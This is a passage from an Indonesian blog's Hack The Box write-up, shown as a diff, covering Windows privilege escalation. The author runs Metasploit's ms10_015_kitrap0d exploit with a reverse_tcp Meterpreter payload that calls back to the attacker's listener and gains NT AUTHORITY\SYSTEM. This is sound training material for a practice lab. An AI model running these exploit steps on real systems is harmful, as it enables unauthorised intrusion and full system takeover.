+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Post module execution completed
+</span></span><span style="display:flex;"><span>msf6 post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; 
+</span></span></code></pre></div><p>dari hasil tersebut saya mengetahui terdapat banyak kemungkinan untuk melakukan privilege escalation, disini saya akan menggunakan module exploit <strong>exploit/windows/local/ms10_015_kitrap0d</strong>  cara kerja module ini membuat sebuah sesi baru dengan SYSTEM privilege dari exploit KiTrap0D yang dibuat oleh Travis Ormandy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   SESSION  <span style="color:#ae81ff">1</span>                yes       The session to run this module on
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     10.10.14.15  yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Windows 2K SP4 - Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/local/ms10_015_kitrap0d<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.15:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting payload and triggering the bug...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching netsh to host the DLL...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Process <span style="color:#ae81ff">2872</span> launched.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 2872...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit finished, wait <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>hopefully privileged<span style="color:#f92672">)</span> payload execution to complete.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175174</span> bytes<span style="color:#f92672">)</span> to 10.129.136.185
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.10.14.15:4444 -&gt; 10.129.136.185:49174 <span style="color:#f92672">)</span> at 2022-10-14 07:19:50 -1000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>meterpreter &gt; 
+</span></span></code></pre></div><p>sesuai dengan ekspetasi, saya berhasil mendapatkan akses penuh pada sistem tersebut.</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/easy">#easy</a>
+        
+            <a
+                
+                href="/tags/ftp">#ftp</a>
+        
+            <a
+                
+                href="/tags/hackhebox">#hackhebox</a>
+        
+            <a
+                
+                href="/tags/hacking">#hacking</a>
+        
+            <a
+                
+                href="/tags/privesc">#privesc</a>
+        
+            <a
+                
+                href="/tags/windows">#windows</a>
+        
+            <a
+                
+                href="/tags/writeup">#writeup</a>
+        
+            <a
+                
+                href="/tags/21">#21</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2022 &copy; Justakazh - Nulis karena pelupa
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
